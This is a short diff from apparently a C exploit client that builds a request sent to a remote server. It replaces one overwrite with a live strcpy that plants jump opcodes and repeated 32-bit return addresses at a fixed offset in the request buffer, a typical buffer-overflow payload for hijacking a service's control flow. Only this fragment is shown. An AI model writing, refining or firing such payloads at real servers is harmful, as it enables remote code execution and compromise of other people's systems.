@@ -32,8 +32,8 @@ int main(int argc, char** argv)
 		injectlen++;
 	}
 	//strcpy(&reqstring[805],"\xe0\xaf\x04\x08;");
-	//strcpy(&reqstring[801],"\xeb\x47\x47\xeb\xf9\x99\x04\x08\xf9\x99\x04\x08");
-	strcpy(&reqstring[805],"\xf8\x99\x04\x08");
+	strcpy(&reqstring[796],"\xe9\x1b\xfd\xff\xff\xeb\xf9\xff\xff\xf9\x99\x04\x08\xf9\x99\x04\x08");
+	//strcpy(&reqstring[805],"\xf8\x99\x04\x08");
 
 	int PORTNUM;
 	char SERVER_IP[16];
